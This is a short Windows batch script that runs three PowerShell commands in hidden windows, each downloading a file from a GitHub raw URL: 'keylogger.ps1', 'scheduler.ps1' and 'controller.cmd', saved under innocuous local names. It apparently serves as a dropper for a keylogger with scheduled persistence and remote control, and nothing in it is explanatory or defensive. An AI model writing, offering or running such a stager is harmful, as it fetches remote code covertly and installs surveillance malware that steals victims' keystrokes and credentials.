@echo off

powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/keylogger.ps1 -OutFile p.ps1"

powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/scheduler.ps1 -OutFile i.ps1"

powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/files/controller.cmd -OutFile control.cmd"